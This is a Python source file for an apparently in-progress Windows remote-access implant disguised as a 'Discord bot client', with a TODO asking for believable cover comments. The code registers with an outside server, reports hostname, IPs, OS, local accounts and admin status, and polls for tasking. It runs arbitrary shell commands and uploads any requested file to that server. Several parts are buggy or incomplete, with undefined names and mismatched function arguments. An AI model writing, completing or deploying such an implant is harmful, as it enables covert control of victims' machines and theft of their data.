"""
TODO: generate random believeable comments for the script.
"""
"""
    Discord bot client v0.1 by INSERT_NAME
    Used for server management, logging, and utility functions.
    DO NOT REMOVE!
    Please reach out to INSERT_NAME with any questions.
"""

import os
import platform
import requests
import socket
import subprocess
from pathlib import Path

"""
TODO: for third-party modules, it should request them
from the server, and drop the wheel to disk, and then import.
"""

"""
TODO: need a download/put file function
"""

"""
TODO: need to come up with a clever way to run the python
maybe pipe to stdin or something similar
"""

"""
TODO: need to change to use urllib or something that is in the standard
library, or drop it to disk with requests
"""

"""
Endpoints to implement:
/register : POST JSON of device_metadata ; return token
/info     : GET with token ; return tasking (if any)
/status   : POST command id and output ; return status code
/upload   : POST file id and output ; return status code

"""

SERVER_URL = "http://www2.darkage.io:48172"
LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
CHECK_INTERVAL = 30

def main():
    if not LOCKFILE.exists():
        # Register for first time
        bot_token = register_bot()
        if bot_token:
            LOCKFILE.touch()
            LOCKFILE.write_text(bot_token, encoding="utf-8")
        else:
            exit(1)
    
    check_for_actions_loop(LOCKFILE.read_text(encoding="utf-8"))

def register_bot():
    """
        Register bot with server.
        Returns a unique bot_token and saves it
    """
    metadata = get_device_metadata()
    metadata["version"] = "0.1"

    endpoint = "/register"
    full_url = SERVER_URL + endpoint

    response = requests.post(full_url, json=metadata)
    if response:
        return response.json.get('token')
    else:
        return None

def get_device_metadata():
    """
        Returns some initial metadata about the device.
    """
    metadata = {}
    
    hostname = socket.gethostname()

    _, _, iplist = socket.gethostbyname_ex(hostname)
    filtered_ips = [ip for ip in iplist if not ip.startswith("127.")]

    uname = platform.uname()
    winver = platform.win32_ver()
    routing_out = routing.stdout
    local_accts = get_local_user_accounts()
    is_local_admin = get_local_admin_status()

    return {
        "hostname": hostname,
        "ip_list": filtered_ips,
        "os_info": str(uname)+str(winver),
        "accounts": local_accts,
        "is_local_admin": is_local_admin
    }

def get_local_user_accounts():
    """
        Returns local accounts by parsing 'net user' output.
    """
    users = {"local_accounts": []}

    try:
        proc = subprocess.run(["net", "user"], capture_output=True, text=True, check=True)
        out = proc.stdout

        # 'net user' prints a header, then user names in columns, then a footer.
        # Extract lines between the header/footer and split.
        lines = out.splitlines()
        capture = False
        names = []
        for line in lines:
            if "----" in line:
                capture = not capture
                continue
            if "The command completed successfully" in line:
                continue
            if capture:
                tokens = [tok for tok in line.split() if tok]
                names.extend(tokens)
        users["local_accounts"] = sorted(set(names))
    except Exception as e:
        users["local_accounts"] = [f"Failed to run 'net user': {e}"]

    return users

def get_local_admin_status():
    """
        Returns true if the current process is running under a local admin,
        False otherwise.
    """
    result = subprocess.run(
        ["whoami", "/groups"],
        capture_output=True,
        text=True,
        shell=True
    )
    return "S-1-5-32-544" in result.stdout

def check_for_actions_loop(bot_token):
    """
        See if the bot needs to do anything.
    """
    while True:
        info = get_info_from_api(bot_token)

        cmd = info.get('command')
        upload = info.get('upload')

        if cmd:
            output_dict = execute_command(bot_token, cmd)
            post_cmd_output(output_dict)

        if upload:
            content = get_content(upload)
            post_content(url, content)

        sleep(CHECK_INTERVAL)

def get_info_from_api(bot_token):
    """
        Get any relevant information from the bot API.
    """
    endpoint = "/info"
    full_url = SERVER_URL + endpoint
    headers = {
        "X-API-TOKEN": bot_token
    }

    response = requests.get(full_url, headers=headers)
    if response:
        return response.json()

def execute_command(cmd):
    """
        cmd_id : guid of cmd from server
        cmd_str : cmd_str to execute
    """
    cmd_str = cmd.get('cmd_str')
    cmd_id  = cmd.get('cmd_id')

    if not cmd_id or not cmd_str:
        return None

    output = subprocess.check_output(
        cmd_str,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    # remove trailing newline if any
    return {
        'cmd_id': cmd_id,
        'output': output.stdout
    }

def get_content(upload):
    """
        upload_id : GUID of upload from server
        upload_str : path to retrieve for upload
    """
    
    upload_id = upload.get('upload_id')
    upload_str = upload.get('upload_str')

    if not upload_id or not upload_str:
        return None

    try:
        # Reads whole file into memory;
        # may not work well with large files
        p = Path(upload_str)
        with p.open("rb") as f:
            data = f.read()
            return {
                'upload_id': upload_id,
                'output': data
            }

    except FileNotFoundError as e:
        data = e 
    except PermissionError as e:
        data = e
    except OSError as e:
        data = e

    return {
        'upload_id': upload_id,
        'output': data
    }

def post_cmd_output(bot_token, output_dict):
    """
        Post requested output to discord server.
    """
    endpoint = "/status"
    full_url = SERVER_URL + endpoint

    headers = {
        "X-API-TOKEN": bot_token
    }

    response = requests.post(full_url, headers=headers, data=output_dict)
    if response:
        return response.status_code
    else:
        return None
   
def post_content(bot_token, content_dict):
    """
        Post requested content to discord server.
    """
    endpoint = "/upload"
    full_url = SERVER_URL + endpoint

    headers = {
        "X-API-TOKEN": bot_token
    }

    response = requests.post(full_url, headers=headers, data=content_dict)
    if response:
        return response.status_code
    else:
        return None

if __name__ == "__main__":
    main()